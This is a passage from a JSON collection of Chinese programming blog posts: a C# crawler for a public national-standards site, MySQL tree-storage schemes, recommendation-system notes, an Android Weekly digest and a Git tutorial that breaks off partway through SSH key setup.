"},{"title":"C#爬虫系列（一）——国家标准全文公开系统","body":"网上有很多Python爬虫的帖子，不排除很多培训班借着AI的概念教Python，然后爬网页自然是其中的一个大章节，毕竟做算法分析没有大量的数据怎么成。\nC#相比Python可能笨重了些，但实现简单爬虫也很便捷。网上有不少爬虫工具，通过配置即可实现对某站点内容的抓取，出于定制化的需求以及程序员重复造轮子的习性，我也做了几个标准公开网站的爬虫。\n在学习的过程中，爬网页的难度越来越大，但随着问题的一一攻克，学习到的东西也越来越多，从最初简单的GET，到POST，再到模拟浏览器填写表单、提交表单，数据解析也从最初的字符串处理、正则表达式处理，到HTML解析。一个NB的爬虫需要掌握的知识不少，HTTP请求、响应，HTML DOM解析，正则表达式匹配内容，多线程、数据库存储，甚至有些高级验证码的处理都得AI。\n当然，爬爬公开标准不是那么难，比如国家标准全文公开系统。\n整个过程需要爬以下页面：\n\n列表页\n详细信息页\n文件下载页\n\n需要处理的技术问题有：\n\nHTTP请求\n正则表达式\nHTML解析\nSqlLite数据库存储\n\n一、列表页\n首先查看到标准分GB和GB/T两类，地址分别为：\nhttp://www.gb688.cn/bzgk/gb/std_list_type?p.p1=1&p.p90=circulation_date&p.p91=desc\n和\nhttp://www.gb688.cn/bzgk/gb/std_list_type?p.p1=2&p.p90=circulation_date&p.p91=desc。\n从中可以看出，GET请求的查询字符串参数p1值为1和2分别查询到GB和GB/T。因此，要获取到标准列表，向以上地址发送GET请求即可。\n\nHttpWebRequest httprequst = (HttpWebRequest)WebRequest.Create(Url);\nHttpWebResponse webRes = (HttpWebResponse)httprequst.GetResponse();\n using (System.IO.Stream stream = webRes.GetResponseStream())\n{\n     using (System.IO.StreamReader reader = new StreamReader(stream,         System.Text.Encoding.GetEncoding(\"utf-8\")))\n     {\n         content = reader.ReadToEnd();\n     }\n }\n\n标准共N多页，查看第二页标准列表，地址更改为：\nhttp://www.gb688.cn/bzgk/gb/std_list_type?r=0.7783908698326173&page=2&pageSize=10&p.p1=1&p.p90=circulation_date&p.p91=desc。\n由此可见page参数指定了分页列表的当前页数，据此，循环请求即可获取到所有的标准列表信息。\n\n二、详细信息页\n获取到标准列表后，下一步我需要获取到标准的详细信息页，从详细信息页中抓取更多的标准说明信息，例如标准的发布单位、归口单位等。\n\n查看标准详细页URL，其值为：\nhttp://www.gb688.cn/bzgk/gb/newGbInfo?hcno=9E5467EA1922E8342AF5F180319F34A0。\n可以看出每个标准有个GUID值，在列表页面中点击按钮“查看详细”，转到详细页。实现这个跳转的方式，最简单的是HTML超链接，此外还可以是JS脚本，甚至是POST数据到服务器。不同的链接方式，自然需要不同的抓取方式，因此需要查看列表页源码来分析该站点的实现方式并找到对应的处理方法。\n\n通过分析源码，可以看到在点击标准号时，通过JS的showInfo函数打开详细页面，由于JS方法传递的ID即为详细页面的参数ID，因此没必要去模拟onclick执行JS函数，直接解析到该GUID，GET请求详细页面即可。解析该GUID值，可以通过正则表达式方便的抓取到。\n获取到详细信息页面后，要解析其中的内容，此时使用正则表达式解析就比较费劲了，可以采用HTML解析。C#解析HTML的第三方类库有不少，选择其中一款即可，HtmlAgilityPack或Winista.HtmlParser都是比较好用的。\n三、文件下载页\n解析到标准详细信息后，还需要进一步获取到标准PDF文件，分析详细页面可以看到标准文件下载页面路径为：\nhttp://c.gb688.cn/bzgk/gb/showGb?type=download&hcno=9E5467EA1922E8342AF5F180319F34A0\n\n进一步分析PDF文件的URL为：\nhttp://c.gb688.cn/bzgk/gb/viewGb?hcno=9E5467EA1922E8342AF5F180319F34A0。\n仍然是那个GUID值，因此可以直接GET请求该地址即可下载标准PDF文件。\n至此标准的属性信息和标准PDF文件都可以下载到了，然后需要将这些信息存储起来。存储为SQL Server、Oracle自然比较笨重，即使Excel和Access也不大友好，推荐此类临时存储可以使用SqlLite。\n\n\n string connectionString = @\"Data Source=\" + dbBasePath + \"StandardDB.db;Version=3;\";\nm_dbConnection = new SQLiteConnection(connectionString);\nm_dbConnection.Open();\nSQLiteCommand command = new SQLiteCommand(sql, m_dbConnection);\ncommand.ExecuteNonQuery();\nm_dbConnection.Close();\n\nView Code\n "},{"title":"【MySQL疑难杂症】如何将树形结构存储在数据库中（方案一 Adjacency List）","body":"　　今天来看看一个比较头疼的问题，如何在数据库中存储树形结构呢？\n　　像mysql这样的关系型数据库，比较适合存储一些类似表格的扁平化数据，但是遇到像树形结构这样有深度的人，就很难驾驭了。\n　　举个栗子：现在有一个要存储一下公司的人员结构，大致层次结构如下：\n\n \n　　（画个图真不容易。。）\n　　那么怎么存储这个结构？并且要获取以下信息：\n　　1.查询小天的直接上司。\n　　2.查询老宋管理下的直属员工。\n　　3.查询小天的所有上司。\n　　4.查询老王管理的所有员工。\n　　\n方案一、(Adjacency List)只存储当前节点的父节点信息。\n　　CREATE TABLE Employees(　　eid int,　　ename VARCHAR(100),        position VARCHAR(100),　　parent_id int　　)\n　　记录信息简单粗暴，那么现在存储一下这个结构信息：\n　　\n　　好的，现在开始进入回答环节：\n　　1.查询小天的直接上司：\n 　　SELECT e2.eid,e2.ename FROM employees e1,employees e2 WHERE e1.parent_id=e2.eid AND e1.ename='小天';\n　　\n　　2.查询老宋管理下的直属员工：\n　　SELECT e1.eid,e1.ename FROM employees e1,employees e2 WHERE e1.parent_id=e2.eid AND e2.ename='老宋';\n　　\n　　3.查询小天的所有上司。\n　　这里肯定没法直接查，只能用循环进行循环查询，先查直接上司，再查直接上司的直接上司，依次循环，这样麻烦的事情，还是得先建立一个存储过程：\n　　睁大眼睛看仔细了，接下来是骚操作环节：\n\nCREATE DEFINER=`root`@`localhost` FUNCTION `getSuperiors`(`uid` int) RETURNS varchar(1000) CHARSET gb2312\nBEGIN\n    DECLARE superiors VARCHAR(1000) DEFAULT '';\n    DECLARE sTemp INTEGER DEFAULT uid;\n    DECLARE tmpName VARCHAR(20);\n\n    WHILE (sTemp>0) DO\n        SELECT parent_id into sTemp FROM employees where eid = sTemp;\n        SELECT ename into tmpName FROM employees where eid = sTemp;\n        IF(sTemp>0)THEN\n            SET superiors = concat(tmpName,',',superiors);\n        END IF;\n    END WHILE;\n        SET superiors = LEFT(superiors,CHARACTER_LENGTH(superiors)-1);\n    RETURN superiors;\nEND\n\n　　这一段存储过程可以查询子节点的所有父节点，来试验一下　\n \n　　好的，骚操作完成。\n　　显然，这样。获取子节点的全部父节点的时候很麻烦。。\n　　4.查询老王管理的所有员工。\n　　思路如下：先获取所有父节点为老王id的员工id，然后将员工姓名加入结果列表里，在调用一个神奇的查找函数，即可进行神奇的查找：\n\nCREATE DEFINER=`root`@`localhost` FUNCTION `getSubordinate`(`uid` int) RETURNS varchar(2000) CHARSET gb2312BEGIN   DECLARE str varchar(1000);  DECLARE cid varchar(100);DECLARE result VARCHAR(1000);DECLARE tmpName VARCHAR(100);SET str = '$';   SET cid = CAST(uid as char(10));   WHILE cid is not null DO     SET str = concat(str, ',', cid);   SELECT group_concat(eid) INTO cid FROM employees where FIND_IN_SET(parent_id,cid);         END WHILE;  SELECT GROUP_CONCAT(ename) INTO result FROM employees WHERE FIND_IN_SET(parent_id,str);RETURN result;   END\n\n　　看神奇的结果：\n　\n　　虽然搞出来了，但说实话，真是不容易。。。\n　　这种方法的优点是存储的信息少，查直接上司和直接下属的时候很方便，缺点是多级查询的时候很费劲。所以当只需要用到直接上下级关系的时候，用这种方法还是不错的，可以节省很多空间。后续还会介绍其它存储方案，并没有绝对的优劣之分，适用场合不同而已。\n　　本篇至此告一段落，欢迎大家继续关注。\n "},{"title":"个性化推荐系统最近一些复盘以及探索","body":"       最近和很多人探讨、交流推荐系统相关很多事情，喜欢这种理性探讨，这种探讨能够让双方都有收获，一个是负\n反馈再有就是对于推荐系统怎样做深入，再有就是推荐系统架构一点思索。\n       负反馈最近探讨很多一个问题。一直有疑惑，大部分的内容都是关于movielens这种含有客户负反馈的，但是我\n只是一个普通的电商网站，只有客户的购买浏览等记录，却缺乏客户不喜欢物品的负反馈，即使是我使用itemcf，也\n只能是单类协同过滤，效果不是很好，查了一些paper，除了使用其他的结合内容，上下文等之外，就只有采样了，\n但是我所在的行业，就算客户没买，也不一定是不喜欢，只是可能不知道而已，想探讨一下，是否了解这种隐反馈的场\n景实际应用中还有没有其他的处理方法呢？\n        这是一个好问题，一个有意思问题，也是我们探讨了很多次问题。负反馈其实我们可以思考一下，不买就是不喜\n欢或者说没推准？那推出来不点击不浏览呢？应是不能作为负反馈的，因为一个用户不点击、不购买因素太多了，钱\n不够？人委屈（对这个素材不满意而已，把品类都降权太极端）了可能都不会去点击。\n        再有就是现在淘宝京东等app对于素材都有负反馈收集，但其实了解到负反馈人很少，因为用户没义务去点击那\n个，他也不愿意去反馈。其实很多用户是不满意就直接走了，不会提意见的，这是实际数据反馈情况。\n        那负反馈要不要做，做是当然要做但要小心做，因为其实很多用户在频道内行为是很有限的，分类召回级直接卡\n掉，点击、浏览、GMV转化等指标应该一下就会降一大截。\n        现在推荐系统，两个方面一个是用户持久喜好，作为离线偏好，这种负反馈尽量不要做。另外是用户实时篇好，\n因为很多情况下用户看到喜欢内容、商品会点击两下看看，真喜欢可能就购买了。实时用户篇好目前是很重要用户推\n荐构成部分，能抓取就抓用户了，抓不住就走了。对于实时篇好可以根据给用户推荐内容、商品都未点击，可以做降\n权处理，不是过滤，过滤要慎重，用户点击多了还要加权，抓住用户实时兴趣，引导用户多浏览、多看。\n       我所在的行业,但是由于某一类目的商品选择较少,导致这一类型各个商品和其他类型的各种商品的相似度都较高,\n导致不管其他什么商品都会很容易推荐这一类目的热门商品,请问您有遇到过这种情况嘛?一般工程上会怎样解决这种\n问题呢?\n        关于推荐系统的热门商品权重过大的问题，除了上面的规则干预，还有没其他的模型计算方法呢？我用的是项亮\n书中的在itemcf时变了分母的幂次，但效果不好，您还知道工程中有其他合适的算法嘛？\n       热门商品是个好东西，但不受控制总是推出热门商品不是一个好的做法，热门商品作为一个单独热门召回级，热\n门商品被关联数量一定要控制，设置相关策略阀值。\n       对于热门商品做热度算法处理，就是热门内容、商品作为召回级，给予阶梯式曝光，如果热门能很大程度提升整\n体转化指标，那么可以给相应加权如做不到进行相应降权。\n       热门商品召回级还有一个很大用处，目前看在一个频道很多用户是行为很少的，热门作为拉新很重要一个手段，\n因为热门某种意义就是命中了大多数人喜好。是作为召回级不够用户很重要一个数据补充渠道，用好还是相当重要。\n       最近探讨另外一个重要点，推荐系统如何做深入，毕竟越深越美，如果有了粗力度召回级，那么就是做细粒度召\n回级。就像文章，最开始做主题LDA分类，但这种分类很粗，加进相似文章召回，数据猛的一升。后来又做了细粒度\n标签比主题细分很多一种划分主题方式，这种就要结合LDA将力度又不要划分太细，不然会发现用户点击两下全是同\n一个内容。\n       内容细的标签，沉下心来仔细想想，很像搜索引擎，用户点击某个标签，然后返回标签下内容。如果把标签理解\n为搜索引擎搜索词，这就是极其类似召回数据方式。很多事情都是相通的，要静下心来去探索、去发现。\n       商品最近也是在探索细粒度召回级事情，以前做的更多是品类，品类作为召回级核心，后边会更多探索用户对于\n品牌、性别、价格段、季节、地理位置、手机信息等多个更细粒度召回级探索。补充完善粗召回级之外内容，预估对\n转化数据都是会有提升的。\n       再有就是也在对于商品标签不断完善，是另外一个方向对于召回级扩大以及更加细分，让用户行为能更精准进行\n推荐。品牌、价格段、性别、商品标签都是对于商品分类召回细化，仔细想想很像是对于内容由主题到标签，粗粒度\n细粒度结合。\n       这些新的尝试对于线上推荐服务、推荐引擎也是一个新的挑战，需要花费心思去将架构抽象化合理化。其实做事\n情难易程度，不在于外界，在于你对于自己要求，要求高了，难度自然就大了。\n       最近在看Google对于分布式系统设计方面内容，收获很多，对于复杂系统给出最简洁设计，是Google设计分布式\n系统很重要设计理念，求于至简，归于永恒。简洁其实是很难很复杂要求很高设计，因为所有事情都考虑到，才能做到\n至简，至繁归于至简。\n\n      扫码关注公众号"},{"title":"【MySQL疑难杂症】如何将树形结构存储在数据库中（方案二 Path Enumeration）","body":"　　今天来介绍把树形结构存入数据库的第二种方法——路径枚举法。\n　　还是借用上一篇的栗子，为了方便大家查阅，我把图又原样搬过来了。\n\n　　需要回答的问题依旧是这样几个：\n　　1.查询小天的直接上司。\n　　2.查询老宋管理下的直属员工。\n　　3.查询小天的所有上司。\n　　4.查询老王管理的所有员工。\n方案二、 Path Enumeration 路径枚举法，记录下根节点到每个子节点的路径。\n　　先创建表：\n\nCREATE TABLE employees2(\neid INT,\nename VARCHAR(100),\nposition VARCHAR(100),\npath VARCHAR(200)\n)\n\n　　然后插入数据：\n\n　　现在我们来回答一下之前的问题：\n　　1.查询小天的直接上司。\n　　在上一个解决方案中能轻而易举做到的事情，在这个方案中却有些麻烦了，因为需要对path字段进行字符串处理，去掉“/”+自身id才是直接上司的path值。又开始一顿骚操作：\n　　SELECT e1.eid,e1.ename FROM employees2 e1,employees2 e2 WHERE e2.ename = '小天' AND e1.path = REPLACE(e2.path,CONCAT('/',e2.eid),'');\n　　好像这个操作还不够sao，2333，结果如下：\n　　\n　　2.查询老宋管理下的直属员工。\n　　怎么查管理下的直属员工呢？那就要用模糊查询了：\n　　SELECT e2.eid,e2.ename FROM employees2 e1,employees2 e2 WHERE e1.ename = '老宋' AND e2.path REGEXP CONCAT(e1.path,'/[0-9]{1,}$');\n　　这里用了正则匹配，匹配所有path符合规则的记录，结果如下：\n　　\n　　3.查询小天的所有上司。\n　　SELECT e1.eid,e1.ename FROM employees2 e1,employees2 e2 WHERE e2.ename='小天' AND e2.path like concat(e1.path,'/%');\n　　这里就能体现这种存储结构的优势了。不看效率的话，还是很方便的。\n　　\n　　4.查询老王管理的所有员工。\n　　SELECT e2.eid,e2.ename FROM employees2 e1,employees2 e2 WHERE e1.ename='老王' AND e2.path like concat(e1.path,'/%');\n　　看吧，查起来就so easy了。\n　　\n　　不用像之前那样写一大段存储过程了，简单粗暴。\n　　小结一下，存储路径的方式在进行多级查询的时候十分方便，而在查询直接上下级的时候稍微复杂一点。还有一个很明显的缺点，那就是path的大小是指定的，所以理论上是不能进行无限层级的存储的，path值设置的越大，浪费的空间就越多。\n　　至此，本篇介绍完毕，之后还会介绍其他方法，欢迎大家继续关注！\n "},{"title":"Android Weekly Notes Issue #286","body":"December 3rd, 2017\nAndroid Weekly Issue #286\n本期文章包含如何通过踩坑来学习Kotlin,以及利用Kotlin的data class做MVVM状态保存,还包含一些基础知识的介绍,如RxJava2线程切换,Kotlin与Java容器分析.\n另外,还包括Intant App的软文一篇,以及 Android O对Notification进行Channel管理的文章,帮助大家适配O以上的通知.\n\nARTICLES & TUTORIALS\nSome useful insights on Instant apps\n文章介绍了荷兰的新闻应用NOS支持IA的实例,技术成分不多,更像是新闻报道,需要了解IA具体实现的可能得不到想要的.\nUsing Espresso to Test Opening Links\n一个女博主的小发现,如何通过Espresso测试通过TextView的autolink打开其他程序.\n其实是通过openLinkWithText来发出这个事件.\nLearning Kotlin by Mistake\n文章介绍了在错误中不断前行,学习Kotlin相别于Java的特性.\n如尽量的通过applay run let with等操作符将你的逻辑连起来.\nCompanionObjects与@JvmStatic @JvmField的取舍\nlateinit与by lazy的故事,以及自定义Delegate等等.\n最笨的办法也可以通过自动转换来学习,但是自动转换出来的并不是完全纯粹的Kotlin哦.\nPaper Signals: A Voice Experiment\n一个IoT的教学,制作一个声音盒子,通过你的语音可以变形. 比较有趣的是盒子的模型零件可以打印出来自己剪裁.\n需要的Code他们已经提供了.\n当然最重要的是,需要买材料,$24.95.\nKotlin Collections Inside. Part 1\n一个分析Kotlin容器的系列文章,这是第一篇,关于List.\n主要讲了Java与Kotlin容器的关系,对于Kotlin来说,所有Java的容器都是Mutable的,而对于Java来说Kotlin的Immutable容器可以调用改动操作,但是会抛异常.\n并且介绍了Kotlin如何初始化Immutable与Mutable的List,通过ByteCode分析,虽然MutableList没有继承与Java的ArrayList,但是通过arrayListOf与mutableListOf生成的List可以互转,原因是MutableList在生成ByteCode后,也同样继承了ArrayList....\nMulti-Threading Like a Boss in Android With RxJava 2\n文章主要讲了RxJava2如何在线程之间随意切换的,虽然没有涉及实现原理,但是通俗的讲解了subscribeOn与observerOn的使用.一个是改变source,一个是改变downstream.\nOreo Notifications: Channels – Part 1\n文章介绍Android O对于Notification的新概念,Channel,对于没有使用新的Notification Compat API设置Channel的,将不会再Android O上弹出通知.\nChannel是为了让用户对程序的不同Notification进行分组管理,可以对不同Channel分别设置开关,以及通知方式(震动,亮灯,静音等).\n与Channel配合的还有Group,可以将某几个Channel归类于一个Group,在设置页面可以看到不同的Group下的有不同Channel.\nRepresenting View State with Kotlin Data Classes\n文章介绍了把所有状态封装在一个ViewState的data class里,并通过其copy的方法,对发生变化的状态进行改变,这样可以保持其他状态不变.\n该状态可以作为ViewModel里面的一个Observable被订阅,获取不同状态下的ViewState,对UI进行操作.\nKotlin on the Backend\nRocket Travel已经使用Kotlin做Spring Boot开发一年有余,评价很好,可以在后端开发中使用到Kolin的feature,一定很High.\nLIBRARIES & CODE\nRoboPOJOGenerator\n一个插件可以直接将JSON转成Java或者Kotlin的POJO文件...\navdo\nPython的包,可以优化Vector动画或者Drawable文件.\n"},{"title":"分布式版本控制系统 Git 教程","body":"简介\nGit 是什么？\nGit 是一个开源的分布式版本控制系统。\n什么是版本控制？\n版本控制是一种记录一个或若干文件内容变化，以便将来查阅特定版本修订情况的系统。\n什么是分布式版本控制系统？\n介绍分布式版本控制系统前，有必要先了解一下传统的集中式版本控制系统。\n集中化的版本控制系统，诸如 CVS，Subversion 等，都有一个单一的集中管理的服务器，保存所有文件的修订版本，而协同工作的人们都通过客户端连到这台服务器，取出最新的文件或者提交更新。\n这么做最显而易见的缺点是中央服务器的单点故障。如果宕机一小时，那么在这一小时内，谁都无法提交更新，也就无法协同工作。要是中央服务器的磁盘发生故障，碰巧没做备份，或者备份不够及时，就会有丢失数据的风险。最坏的情况是彻底丢失整个项目的所有历史更改记录。\n\n分布式版本控制系统的客户端并不只提取最新版本的文件快照，而是把代码仓库完整地镜像下来。这么一来，任何一处协同工作用的服务器发生故障，事后都可以用任何一个镜像出来的本地仓库恢复。因为每一次的提取操作，实际上都是一次对代码仓库的完整备份。\n\n为什么使用 Git？\nGit 是分布式的。这是 Git 和其它非分布式的版本控制系统，例如 svn，cvs 等，最核心的区别。分布式带来以下好处：\n工作时不需要联网\n首先，分布式版本控制系统根本没有“中央服务器”，每个人的电脑上都是一个完整的版本库，这样，你工作的时候，就不需要联网了，因为版本库就在你自己的电脑上。既然每个人电脑上都有一个完整的版本库，那多个人如何协作呢？比方说你在自己电脑上改了文件A，你的同事也在他的电脑上改了文件A，这时，你们俩之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。\n更加安全\n集中式版本控制系统，一旦中央服务器出了问题，所有人都无法工作。\n分布式版本控制系统，每个人电脑中都有完整的版本库，所以某人的机器挂了，并不影响其它人。\n原理\n版本库\n当你一个项目到本地或创建一个 git 项目，项目目录下会有一个隐藏的 .git 子目录。这个目录是 git 用来跟踪管理版本库的，千万不要手动修改。\n哈希值\nGit 中所有数据在存储前都计算校验和，然后以校验和来引用。 这意味着不可能在 Git 不知情时更改任何文件内容或目录内容。 这个功能建构在 Git 底层，是构成 Git 哲学不可或缺的部分。 若你在传送过程中丢失信息或损坏文件，Git 就能发现。\nGit 用以计算校验和的机制叫做 SHA-1 散列（hash，哈希）。 这是一个由 40 个十六进制字符（0-9 和 a-f）组成字符串，基于 Git 中文件的内容或目录结构计算出来。 SHA-1 哈希看起来是这样：\n24b9da6552252987aa493b52f8696cd6d3b00373\nGit 中使用这种哈希值的情况很多，你将经常看到这种哈希值。 实际上，Git 数据库中保存的信息都是以文件内容的哈希值来索引，而不是文件名。\n文件状态\n在 GIt 中，你的文件可能会处于三种状态之一：\n\n已修改（modified）\n\n已修改表示修改了文件，但还没保存到数据库中。\n\n已暂存（staged）\n\n已暂存表示对一个已修改文件的当前版本做了标记，使之包含在下次提交的快照中。\n\n已提交（committed）\n\n已提交表示数据已经安全的保存在本地数据库中。 \n工作区域\n与文件状态对应的，不同状态的文件在 Git 中处于不同的工作区域。\n\n工作区（working）\n\n当你 git clone 一个项目到本地，相当于在本地克隆了项目的一个副本。\n工作区是对项目的某个版本独立提取出来的内容。 这些从 Git 仓库的压缩数据库中提取出来的文件，放在磁盘上供你使用或修改。\n\n暂存区（staging）\n\n暂存区是一个文件，保存了下次将提交的文件列表信息，一般在 Git 仓库目录中。 有时候也被称作`‘索引’'，不过一般说法还是叫暂存区。\n\n本地仓库（local）\n\n提交更新，找到暂存区域的文件，将快照永久性存储到 Git 本地仓库。\n\n远程仓库（remote）\n\n以上几个工作区都是在本地。为了让别人可以看到你的修改，你需要将你的更新推送到远程仓库。\n同理，如果你想同步别人的修改，你需要从远程仓库拉取更新。\n\n安装\nLinux\nDebian/Ubuntu\n如果你使用的系统是 Debian/Ubuntu ， 安装命令为：\n$ apt-get install libcurl4-gnutls-dev libexpat1-dev gettext \\\n> libz-dev libssl-dev\n$ apt-get install git-core\n$ git --version\ngit version 1.8.1.2\nCentos/RedHat\n如果你使用的系统是 Centos/RedHat ，安装命令为：\n$ yum install curl-devel expat-devel gettext-devel \\\n> openssl-devel zlib-devel\n$ yum -y install git-core\n$ git --version\ngit version 1.7.1\nWindows\n在Git 官方下载地址下载 exe 安装包。按照安装向导安装即可。\n建议安装 Git Bash 这个 git 的命令行工具。\nMac\n在Git 官方下载地址下载 mac 安装包。按照安装向导安装即可。\n配置\nGit 自带一个 git config 的工具来帮助设置控制 Git 外观和行为的配置变量。 这些变量存储在三个不同的位置：\n\n/etc/gitconfig 文件: 包含系统上每一个用户及他们仓库的通用配置。 如果使用带有 --system 选项的 git config 时，它会从此文件读写配置变量。\n~/.gitconfig 或 ~/.config/git/config 文件：只针对当前用户。 可以传递 --global 选项让 Git 读写此文件。\n当前使用仓库的 Git 目录中的 config 文件（就是 .git/config）：针对该仓库。\n\n每一个级别覆盖上一级别的配置，所以 .git/config 的配置变量会覆盖 /etc/gitconfig 中的配置变量。\n在 Windows 系统中，Git 会查找 $HOME 目录下（一般情况下是 C:\\Users\\$USER）的 .gitconfig 文件。 Git 同样也会寻找 /etc/gitconfig 文件，但只限于 MSys 的根目录下，即安装 Git 时所选的目标位置。\n用户信息\n当安装完 Git 应该做的第一件事就是设置你的用户名称与邮件地址。 这样做很重要，因为每一个 Git 的提交都会使用这些信息，并且它会写入到你的每一次提交中，不可更改：\n$ git config --global user.name \"John Doe\"\n$ git config --global user.email johndoe@example.com\n再次强调，如果使用了 --global 选项，那么该命令只需要运行一次，因为之后无论你在该系统上做任何事情， Git 都会使用那些信息。 当你想针对特定项目使用不同的用户名称与邮件地址时，可以在那个项目目录下运行没有 --global 选项的命令来配置。\n很多 GUI 工具都会在第一次运行时帮助你配置这些信息。\n.gitignore\n.gitignore 文件可能从字面含义也不难猜出：这个文件里配置的文件或目录，会自动被 git 所忽略，不纳入版本控制。\n在日常开发中，我们的项目经常会产生一些临时文件，如编译 Java 产生的 *.class 文件，又或是 IDE 自动生成的隐藏目录（Intellij 的 .idea 目录、Eclipse 的 .settings 目录等）等等。这些文件或目录实在没必要纳入版本管理。在这种场景下，你就需要用到 .gitignore 配置来过滤这些文件或目录。\n配置的规则很简单，也没什么可说的，看几个例子，自然就明白了。\n这里推荐一下 Github 的开源项目：https://github.com/github/gitignore\n在这里，你可以找到很多常用的模板，如：Java、Nodejs、C++ 的 .gitignore 模板等等。\n命令\n国外网友制作了一张 Git Cheat Sheet，总结很精炼，各位不妨收藏一下。\n本节选择性介绍 git 中比较常用的命令行场景。\n\n创建\n克隆一个已创建的仓库\n# 通过 SSH\n$ git clone ssh://user@domain.com/repo.git\n\n#通过 HTTP\n$ git clone http://domain.com/user/repo.git\n创建一个新的本地仓库\n$ git init\n添加修改\n添加修改到暂存区\n# 把指定文件添加到暂存区\n$ git add xxx\n\n# 把当前所有修改添加到暂存区\n$ git add .\n\n# 把所有修改添加到暂存区\n$ git add -A\n提交修改到本地仓库\n# 提交本地的所有修改\n$ git commit -a\n\n# 提交之前已标记的变化\n$ git commit\n\n# 附加消息提交\n$ git commit -m 'commit message'\n储藏\n有时，我们需要在同一个项目的不同分支上工作。当需要切换分支时，偏偏本地的工作还没有完成，此时，提交修改显得不严谨，但是不提交代码又无法切换分支。这时，你可以使用 git stash 将本地的修改内容作为草稿储藏起来。\n官方称之为储藏，但我个人更喜欢称之为存草稿。\n# 1. 将修改作为当前分支的草稿保存\n$ git stash\n\n# 2. 查看草稿列表\n$ git stash list\nstash@{0}: WIP on master: 6fae349 :memo: Writing docs.\n\n# 3.1 删除草稿\n$ git stash drop stash@{0}\n\n# 3.2 读取草稿\n$ git stash apply stash@{0}\n撤销修改\n撤销本地修改\n# 移除缓存区的所有文件（i.e. 撤销上次git add）\n$ git reset HEAD\n\n# 将HEAD重置到上一次提交的版本，并将之后的修改标记为未添加到缓存区的修改\n$ git reset <commit>\n\n# 将HEAD重置到上一次提交的版本，并保留未提交的本地修改\n$ git reset --keep <commit>\n\n# 放弃工作目录下的所有修改\n$ git reset --hard HEAD\n\n# 将HEAD重置到指定的版本，并抛弃该版本之后的所有修改\n$ git reset --hard <commit-hash>\n\n# 用远端分支强制覆盖本地分支\n$ git reset --hard <remote/branch> e.g., upstream/master, origin/my-feature\n\n# 放弃某个文件的所有本地修改\n$ git checkout HEAD <file>\n删除添加.gitignore文件前错误提交的文件\n$ git rm -r --cached .\n$ git add .\n$ git commit -m \"remove xyz file\"\n撤销远程修改\n创建一个新的提交，并回滚到指定版本\n$ git revert <commit-hash>\n彻底删除指定版本\n# 执行下面命令后，commit-hash 提交后的记录都会被彻底删除，使用需谨慎\n$ git reset --hard <commit-hash>\n$ git push -f\n更新与推送\n更新\n# 下载远程端版本，但不合并到HEAD中\n$ git fetch <remote>\n\n# 将远程端版本合并到本地版本中\n$ git pull origin master\n\n# 以rebase方式将远端分支与本地合并\n$ git pull --rebase <remote> <branch>\n推送\n# 将本地版本推送到远程端\n$ git push remote <remote> <branch>\n\n# 删除远程端分支\n$ git push <remote> :<branch> (since Git v1.5.0)\n$ git push <remote> --delete <branch> (since Git v1.7.0)\n\n# 发布标签\n$ git push --tags\n查看信息\n显示工作路径下已修改的文件\n$ git status\n显示与上次提交版本文件的不同\n$ git diff\n显示提交历史\n# 从最新提交开始，显示所有的提交记录（显示hash， 作者信息，提交的标题和时间）\n$ git log\n\n# 显示某个用户的所有提交\n$ git log --author=\"username\"\n\n# 显示某个文件的所有修改\n$ git log -p <file>\n显示搜索内容\n# 从当前目录的所有文件中查找文本内容\n$ git grep \"Hello\"\n\n# 在某一版本中搜索文本\n$ git grep \"Hello\" v2.5\n分支与标签\n增删查分支\n# 列出所有的分支\n$ git branch\n\n# 列出所有的远端分支\n$ git branch -r\n\n# 基于当前分支创建新分支\n$ git branch <new-branch>\n\n# 基于远程分支创建新的可追溯的分支\n$ git branch --track <new-branch> <remote-branch>\n\n# 删除本地分支\n$ git branch -d <branch>\n\n# 强制删除本地分支，将会丢失未合并的修改\n$ git branch -D <branch>\n切换分支\n# 切换分支\n$ git checkout <branch>\n\n# 创建并切换到新分支\n$ git checkout -b <branch>\n标签\n# 给当前版本打标签\n$ git tag <tag-name>\n\n# 给当前版本打标签并附加消息\n$ git tag -a <tag-name>\n合并与重置\n\nmerge 与 rebase 虽然是 git 常用功能，但是强烈建议不要使用 git 命令来完成这项工作。\n因为如果出现代码冲突，在没有代码比对工具的情况下，实在太艰难了。\n你可以考虑使用各种 Git GUI 工具。\n\n合并\n# 将分支合并到当前HEAD中\n$ git merge <branch>\n重置\n# 将当前HEAD版本重置到分支中，请勿重置已发布的提交\n$ git rebase <branch>\nGithub\nGithub 作为最著名的代码开源协作社区，在程序员圈想必无人不知，无人不晓。\n这里不赘述 Github 的用法，确实有不会用的新手同学，可以参考官方教程：https://guides.github.com/\nclone 方式\nGit 支持三种协议：HTTPS / SSH / GIT\n而 Github 上支持 HTTPS 和 SSH。\nHTTPS 这种方式要求你每次 push 时都要输入用户名、密码，有些繁琐。\n而 SSH 要求你本地生成证书，然后在你的 Github 账户中注册。第一次配置麻烦是麻烦了点，但是以后就免去了每次 push 需要输入用户名、密码的繁琐。\n\n以下介绍以下，如何生成证书，以及在 Github 中注册。\n生成 SSH 公钥\n如前所述，许多 Git 服务器都使用 SSH 公钥进行认证。 为了向 Git 服务器提供 SSH 公钥，如果某系统用户尚未拥有密钥，必须事先为其生成一份。 这个过程在所有操作系统上都是相似的。 首先，你需要确认自己是否已经拥有密钥。 默认情况下，用户的 SSH 密钥存储在其 ~/.ssh 目录下。 进入该目录并列出其中内容，你便可以快速确认自己是否已拥有密钥：\n$ cd ~/.ssh\n$ ls\nauthorized_keys2  id_dsa       known_hosts\nconfig            id_dsa.pub\n我们需要寻找一对以 id_dsa 或 id_rsa 命名的文件，其中一个带有 .pub 扩展名。 .pub 文件是你的公钥，另一个则是私钥。 如果找不到这样的文件（或者根本没有 .ssh 目录），你可以通过运行 ssh-keygen 程序来创建它们。在 Linux/Mac 系统中，ssh-keygen 随 SSH 软件包提供；在 Windows 上，该程序包含于 MSysGit 软件包中。\n$ ssh-keygen\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/home/schacon/.ssh/id_rsa):\nCreated directory '/home/schacon/.ssh'.\nEnter passphrase (empty for no passphrase):\nEnter same passphrase again:\nYour identification has been saved in /home/schacon/.ssh/id_rsa.\nYour public key has been saved in /home/schacon/.ssh/id_rsa.pub.\nThe key fingerprint is:\nd0:82:24:8e:d7:f1:bb:9b:33:53:96:93:49:da:9b:e3 schacon@mylaptop.local\n首先 ssh-keygen 会确认密钥的存储位置（默认是 